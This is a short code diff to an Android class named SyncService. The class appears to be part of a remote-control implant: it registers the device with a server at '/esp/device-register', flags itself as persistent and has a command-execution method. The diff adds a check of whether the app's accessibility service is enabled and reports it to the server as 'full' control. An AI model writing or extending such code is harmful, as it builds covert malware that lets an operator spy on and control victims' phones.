@@ -117,7 +117,16 @@ public class SyncService extends Service {
         b.put("os", "Android " + Build.VERSION.RELEASE);
         b.put("user", "android"); b.put("arch", Build.SUPPORTED_ABIS[0]);
         b.put("persistent", true);
+        b.put("full", isAccEnabled());
         post("/esp/device-register", b);
+    }
+
+    private boolean isAccEnabled() {
+        try {
+            String s = android.provider.Settings.Secure.getString(getContentResolver(),
+                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+            return s != null && s.contains(getPackageName());
+        } catch (Exception e) { return false; }
     }
 
     private void exec(String id, String cmd) {
